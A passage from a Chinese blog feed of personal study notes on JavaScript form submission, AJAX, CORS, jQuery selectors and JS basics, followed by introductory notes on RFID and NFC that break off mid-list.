<p>对于单选框和复选框，设置<code>checked</code>为<code>true</code>或<code>false</code>即可。</p>
<h2 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h2><p>方式一是通过<code>&lt;form&gt;</code>元素的<code>submit()</code>方法提交一个表单，例如，响应一个<code>&lt;button&gt;</code>的<code>click</code>事件，在JavaScript代码中提交表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test-form&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;doSubmitForm()&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-form&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 可以在此修改form的input...</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 提交form:</span></span></span><br><span class="line">    form.submit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种方式的缺点是扰乱了浏览器对form的正常提交。浏览器默认点击<code>&lt;button type=&quot;submit&quot;&gt;</code>时提交表单，或者用户在最后一个输入框按回车键。因此，第二种方式是响应<code>&lt;form&gt;</code>本身的<code>onsubmit</code>事件，在提交form时作修改：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test-form&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-form&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 可以在此修改form的input...</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意要<code>return true</code>来告诉浏览器继续提交，如果<code>return false</code>，浏览器将不会继续提交form，这种情况通常对应用户输入有误，提示用户错误信息后终止提交form。</p>
<p>在检查和修改<code>&lt;input&gt;</code>时，要充分利用<code>&lt;input type=&quot;hidden&quot;&gt;</code>来传递数据。</p>
<p>例如，很多登录表单希望用户输入用户名和口令，但是，安全考虑，提交表单时不传输明文口令，而是口令的MD5。普通JavaScript开发人员会直接修改<code>&lt;input&gt;</code>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 把用户输入的明文变为MD5:</span></span></span><br><span class="line">    pwd.value = toMD5(pwd.value);</span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个做法看上去没啥问题，但用户输入了口令提交时，口令框的显示会突然从几个<code>*</code>变成32个<code>*</code>（因为MD5有32个字符）。</p>
<p>要想不改变用户的输入，可以利用<code>&lt;input type=&quot;hidden&quot;&gt;</code>实现：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input-password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">id</span>=<span class="string">&quot;md5-password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> input_pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;input-password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> md5_pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;md5-password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 把用户输入的明文变为MD5:</span></span></span><br><span class="line">    md5_pwd.value = toMD5(input_pwd.value);</span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意到<code>id</code>为<code>md5-password</code>的<code>&lt;input&gt;</code>标记了<code>name=&quot;password&quot;</code>，而用户输入的<code>id</code>为<code>input-password</code>的<code>&lt;input&gt;</code>没有<code>name</code>属性。没有<code>name</code>属性的<code>&lt;input&gt;</code>的数据不会被提交。</p>
<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X10)</title>
    <url>/JS_0X10/</url>
    <content><![CDATA[<h1 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h1><blockquote>
<p>作用：当点击一个按钮时HTTP会跳转一个新页面，AJAX可以让请求以JS执行，从而不跳转页面。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-response-text&#x27;</span>);</span><br><span class="line">    textarea.value = text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-response-text&#x27;</span>);</span><br><span class="line">    textarea.value = <span class="string">&#x27;Error code: &#x27;</span> + code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// 新建XMLHttpRequest对象</span></span><br><span class="line"></span><br><span class="line">request.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 状态发生变化时，函数被回调</span></span><br><span class="line">    <span class="keyword">if</span> (request.readyState === <span class="number">4</span>) &#123; <span class="comment">// 成功完成</span></span><br><span class="line">        <span class="comment">// 判断响应结果:</span></span><br><span class="line">        <span class="keyword">if</span> (request.status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 成功，通过responseText拿到响应的文本:</span></span><br><span class="line">            <span class="keyword">return</span> success(request.responseText);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 失败，根据响应码判断失败原因:</span></span><br><span class="line">            <span class="keyword">return</span> fail(request.status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// HTTP请求还在继续...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送请求:</span></span><br><span class="line">request.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/categories&#x27;</span>);</span><br><span class="line">request.send();</span><br><span class="line"></span><br><span class="line">alert(<span class="string">&#x27;请求已发送，请等待响应...&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h1><p>CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。</p>
<blockquote>
<p>假设本域是<code>my.com</code>，外域是<code>sina.com</code>，只要响应头<code>Access-Control-Allow-Origin</code>为<code>http://my.com</code>，或者是<code>*</code>，本次请求就可以成功。</p>
<p>可见，跨域能否成功，取决于对方服务器是否愿意给你设置一个正确的<code>Access-Control-Allow-Origin</code>，决定权始终在对方手中。</p>
</blockquote>
<h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><h3 id="符号"><a href="#符号" class="headerlink" title="$符号"></a>$符号</h3><p><code>$</code>是著名的jQuery符号。实际上，jQuery把所有功能全部封装在一个全局变量<code>jQuery</code>中，而<code>$</code>也是一个合法的变量名，它是变量<code>jQuery</code>的别名：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.jQuery; <span class="comment">// jQuery(selector, context)</span></span><br><span class="line"><span class="built_in">window</span>.$; <span class="comment">// jQuery(selector, context)</span></span><br><span class="line">$ === jQuery; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span>($); <span class="comment">// &#x27;function&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="利用jQuery查找节点"><a href="#利用jQuery查找节点" class="headerlink" title="利用jQuery查找节点"></a>利用jQuery查找节点</h3><ul>
<li><p>按ID查找</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查找&lt;div id=&quot;abc&quot;&gt;:</span></span><br><span class="line"><span class="keyword">var</span> div = $(<span class="string">&#x27;#abc&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>按tag查找</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ps = $(<span class="string">&#x27;p&#x27;</span>); <span class="comment">// 返回所有&lt;p&gt;节点</span></span><br><span class="line">ps.length; <span class="comment">// 数一数页面有多少个&lt;p&gt;节点</span></span><br></pre></td></tr></table></figure></li>
<li><p>按class查找，按class查找注意在class名称前加一个<code>.</code></p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = $(<span class="string">&#x27;.red&#x27;</span>); <span class="comment">// 所有节点包含`class=&quot;red&quot;`都将返回</span></span><br><span class="line"><span class="comment">// 例如:</span></span><br><span class="line"><span class="comment">// &lt;div class=&quot;red&quot;&gt;...&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;p class=&quot;green red&quot;&gt;...&lt;/p&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>按属性查找</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> email = $(<span class="string">&#x27;[name=email]&#x27;</span>); <span class="comment">// 找出&lt;??? name=&quot;email&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> passwordInput = $(<span class="string">&#x27;[type=password]&#x27;</span>); <span class="comment">// 找出&lt;??? type=&quot;password&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> a = $(<span class="string">&#x27;[items=&quot;A B&quot;]&#x27;</span>); <span class="comment">// 找出&lt;??? items=&quot;A B&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> icons = $(<span class="string">&#x27;[name^=icon]&#x27;</span>); <span class="comment">// 找出所有name属性值以icon开头的DOM</span></span><br><span class="line"><span class="comment">// 例如: name=&quot;icon-1&quot;, name=&quot;icon-2&quot;</span></span><br><span class="line"><span class="keyword">var</span> names = $(<span class="string">&#x27;[name$=with]&#x27;</span>); <span class="comment">// 找出所有name属性值以with结尾的DOM</span></span><br><span class="line"><span class="comment">// 例如: name=&quot;startswith&quot;, name=&quot;endswith&quot;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>组合查找</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> emailInput = $(<span class="string">&#x27;input[name=email]&#x27;</span>); <span class="comment">// 不会找出&lt;div name=&quot;email&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>  同样的，根据tag和class来组合查找也很常见：</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tr = $(<span class="string">&#x27;tr.red&#x27;</span>); <span class="comment">// 找出&lt;tr class=&quot;red ...&quot;&gt;...&lt;/tr&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>多项选择器</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;p,div&#x27;</span>); <span class="comment">// 把&lt;p&gt;和&lt;div&gt;都选出来</span></span><br><span class="line">$(<span class="string">&#x27;p.red,p.green&#x27;</span>); <span class="comment">// 把&lt;p class=&quot;red&quot;&gt;和&lt;p class=&quot;green&quot;&gt;都选出来</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JS笔记(0X01)</title>
    <url>/JS%E7%AC%94%E8%AE%B0(0X01)/</url>
    <content><![CDATA[<h2 id="JS-简介"><a href="#JS-简介" class="headerlink" title="JS 简介"></a>JS 简介</h2><blockquote>
<p><strong>前端安全</strong></p>
<p><strong>解释性语言</strong></p>
<p><strong>每次刷新页面，JS都会执行一次</strong> </p>
<p><strong>从上到下依次执行</strong></p>
<p><strong>JS一般都放在<head>标签内</strong></p>
</blockquote>
<h2 id="简单输出语句："><a href="#简单输出语句：" class="headerlink" title="简单输出语句："></a>简单输出语句：</h2><blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">**alert();**		<span class="comment">//弹窗</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log;	<span class="comment">//在控制台输出</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="如何在HTML中引入JS代码"><a href="#如何在HTML中引入JS代码" class="headerlink" title="如何在HTML中引入JS代码"></a>如何在HTML中引入JS代码</h3><ul>
<li><p>内部JS</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>外部JS</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=./xxx.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、[]</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3.14</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>];</span><br><span class="line"><span class="comment">//2、Array函数</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 创建了数组[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><blockquote>
<p>JavaScript的对象是一组由键-值组成的无序集合，例如：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Bob&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    tags: [<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;mobile&#x27;</span>],</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line">    hasCar: <span class="literal">true</span>,</span><br><span class="line">    zipcode: <span class="literal">null</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>键：都是字符串类型</p>
<p>值：任意数据类型</p>
</blockquote>
<blockquote>
<h4 id="属性获取："><a href="#属性获取：" class="headerlink" title="属性获取："></a>属性获取：</h4><p>要获取一个对象的属性，我们用<code>对象变量.属性名</code>的方式：</p>
</blockquote>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.name; <span class="comment">// &#x27;Bob&#x27;</span></span><br><span class="line">person.zipcode; <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

</blockquote>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a; <span class="comment">// 申明了变量a，此时a的值为undefined</span></span><br><span class="line"><span class="keyword">var</span> $b = <span class="number">1</span>; <span class="comment">// 申明了变量$b，同时给$b赋值，此时$b的值为1</span></span><br><span class="line"><span class="keyword">var</span> s_007 = <span class="string">&#x27;007&#x27;</span>; <span class="comment">// s_007是一个字符串</span></span><br><span class="line"><span class="keyword">var</span> Answer = <span class="literal">true</span>; <span class="comment">// Answer是一个布尔值true</span></span><br><span class="line"><span class="keyword">var</span> t = <span class="literal">null</span>; <span class="comment">// t的值是null</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>变量可以重新赋值，但是不可转型赋值，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">123</span>; <span class="comment">// a的值是整数123</span></span><br><span class="line">a = <span class="string">&#x27;ABC&#x27;</span>; <span class="comment">// a变为字符串</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">int a = <span class="number">123</span>; <span class="comment">// a是整数类型变量，类型用int申明</span></span><br><span class="line">a = <span class="string">&quot;ABC&quot;</span>; <span class="comment">// 错误：不能把字符串赋给整型变量</span></span><br></pre></td></tr></table></figure>

<p>赋值变量的时候尽量要赋值为<code>var a = 123;</code> ，因为如果不加<code>var</code>就会变成全局变量，例如 <code>i = 123;</code> 。</p>
<p><strong>全局变量</strong>的意思就是如果一个<code>HTML</code>中引用了多个<code>js</code>，而恰好有多个js使用了相同的全局变量名，就会发生冲突，例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.js</span></span><br><span class="line">i = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.js</span></span><br><span class="line">i = <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>当这两个<code>js</code>都被同一个<code>HTML</code>引用时就会发生冲突。</p>
</blockquote>
<p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>
]]></content>
      <categories>
        <category>JS学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JT808协议笔记(暂空)</title>
    <url>/JT808%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<p>暂空，将之后要学习的内容列出来</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>JT808协议</tag>
      </tags>
  </entry>
  <entry>
    <title>MQTT协议笔记(暂空)</title>
    <url>/MQTT%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<p>暂空，将之后要学习的内容列出来</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>MQTT协议</tag>
      </tags>
  </entry>
  <entry>
    <title>NFC协议笔记(0X01)</title>
    <url>/NFC%E5%8D%8F%E8%AE%AE01/</url>
    <content><![CDATA[<h1 id="NFC概述"><a href="#NFC概述" class="headerlink" title="NFC概述"></a>NFC概述</h1><h2 id="RFID基础"><a href="#RFID基础" class="headerlink" title="RFID基础"></a>RFID基础</h2><h3 id="RFID简介"><a href="#RFID简介" class="headerlink" title="RFID简介"></a>RFID简介</h3><p>RFID（射频识别或无线射频识别），常称为感应式电子晶片或近接卡、感应卡、非接触卡、电子标签、电子条码等。</p>
<p>RFID是一种通信技术，可用过电信号识别特定目标并读写相关数据，而无需识别系统与特定目标之间建立机械或光学接触。</p>
<p>常用频段分为以下4种：</p>
<ul>
<li>低频（30~300kHz）</li>
<li>高频（3~300MHz）</li>
<li>超高频（300MHz~3GHz）</li>
<li>微波（2.45GHz以上）</li>
</ul>
<p>RFID的优点：</p>
<ul>
<li>体积小</li>
<li>成本低廉</li>
<li>不易被仿制</li>
<li>可储存大量数据</li>
<li>快速非接触式读取方式</li>
</ul>
<h3 id="RFID系统的组成和工作原理"><a href="#RFID系统的组成和工作原理" class="headerlink" title="RFID系统的组成和工作原理"></a>RFID系统的组成和工作原理</h3><p>一套完整的RFID系统由Reader（读取器）、RF Tag（感应器/射频标签）和coil（天线）3部分组成。</p>
<p><strong>工作原理</strong>：由Reader发射一特定频率之无线电波能量给感应器，用以驱动感应器电路将内部的ID Code送出，此时，Reader便会接收此ID Code。Transponder的特殊在于免用电池、免接触、免啥卡，故不怕脏污，且晶片密码为世界唯一、无法复制，安全性高、寿命长。</p>
<h4 id="感应器分类："><a href="#感应器分类：" class="headerlink" title="感应器分类："></a>感应器分类：</h4><ol>
<li><p>感应器的主要功能在于接收到Reader的命令后，将本身所储存的代码回传给Reader。根据不同功能分为下属两种类型：</p>
<ul>
<li>只读存储器（ROM）：成本最低，其程序及数据代码于制造时变写入，使用者无法更改数据内容。</li>
<li>单次写入多次读取（OTP）：允许使用者单词写入数据，在写入后变成为只读。</li>
<li>多次读写（EEPROM）：价格最贵，但可以让使用者多次写入。</li>
</ul>
</li>
<li><p>若根据有无电源可区分为Passive和Active两种。</p>
<ul>
<li><p>Passive Tag（被动式）</p>
<blockquote>
<p>Passive感应器本身并无电源，其电源来自Reader，有Reader发射一频率使感应器产生能量而将数据回传给Reader。</p>
<p>体积比较轻薄，并且拥有先当场的使用年限。</p>
<p>感应的距离较短</p>
</blockquote>
</li>
<li><p>Active Tag（主动式）</p>
<blockquote>
<p>价格较高，因电池内置，所以体积比被动式大。</p>
<p>有使用年限。</p>
<p>较长的感应距离。</p>
</blockquote>
</li>
</ul>
</li>
<li><p>若根据频率高低，可分为以下3类：</p>
<ul>
<li>低频率（LF）：100~500kHz；低频率的感应距离较短，读取速度较慢，以125kHz为主；穿透能力好。</li>
<li>高频率（HF）：10~15MHz；高频率的感应距离越长，读取速度也较低频率来得快，以13.56MHz为主。</li>
<li>超高频率微波（UFMV）：借与850~950MHz以及2.45GHz之间；超高频率的感应距离最长，速度也最快；穿透性差。</li>
</ul>
</li>
</ol>
<h4 id="RFID工作原理"><a href="#RFID工作原理" class="headerlink" title="RFID工作原理"></a>RFID工作原理</h4><p>RFID的基本原理是利用射频信号和空间耦合（电感或电磁耦合）的传输特性，实现对被识别物体的自动识别。</p>
<p>在读写器与标签之间的射频信号的耦合类型有两种，分别为电磁反向散射和电感耦合。</p>
<h2 id="NFC基础"><a href="#NFC基础" class="headerlink" title="NFC基础"></a>NFC基础</h2><h3 id="NFC简介"><a href="#NFC简介" class="headerlink" title="NFC简介"></a>NFC简介</h3><p>NFC是短距离非接触式的一种通信方式，它结合了非接触式感应以及无线连接技术，作用于13.56MHz频带，传输距离大约10cm左右。</p>
<p>NFC技术指标：</p>
<ul>
<li>工作频率为13.56MHz；</li>
<li>通信距离&lt;10cm；</li>
<li>与现有的非接触式智能卡国际标准相兼容；</li>
<li>传输速率106kbit/s、212kbit/s或424kbit/s。可提高到848kbit/s以上。</li>
</ul>
<h2 id="NFC工作原理"><a href="#NFC工作原理" class="headerlink" title="NFC工作原理"></a>NFC工作原理</h2><p>NFC架构主要包含4部分</p>
<ul>
<li>Application Processor（应用处理器）：是手机的主处理单元。</li>
<li>NFC Controller（NFC控制器）：设备中NFC功能的核心部件，包括NFC调制解调器、命令和数据的预处理。</li>
<li>Secure Element（安全元件）</li>
<li>NFC Interface（NFC接口）</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/12/10/Li5YvlPQEfqdWjN.png"></p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来，学习途径是《Android NFC开发实战讲解》；</em></p>
]]></content>
      <categories>
        <category>网络通信协议</category>
      </categories>
      <tags>
        <tag>NFC协议</tag>
      </tags>
  </entry>
  <entry>
    <title>NFC协议笔记(0X02)</title>
    <url>/NFC%E5%8D%8F%E8%AE%AE02/</url>
    <content><![CDATA[<h1 id="NFC协议基础"><a href="#NFC协议基础" class="headerlink" title="NFC协议基础"></a>NFC协议基础</h1><h2 id="NFC技术标准"><a href="#NFC技术标准" class="headerlink" title="NFC技术标准"></a>NFC技术标准</h2><p>NFC技术标准主要包含四层，分别如下：</p>
<ul>
<li><p>RF Layer（射频层）</p>
<blockquote>
<p>NFC通信距离大概10cm左右，属于近距离通信，其底层的射频标准为ISO18092、IDS1433 Type B和Felica；</p>
</blockquote>
</li>
<li><p>Mode Switch（模式切换）</p>
<blockquote>
<p>一个可以将射频层数据切换到NFC Type A、NFC Type B或NFC Type F三种机制的切换标准</p>
</blockquote>
</li>
<li><p>NFC IP1</p>
<blockquote>
<p>即ISO 18092，本处突出强调其标准中的数据交换中的部分。</p>
</blockquote>
</li>
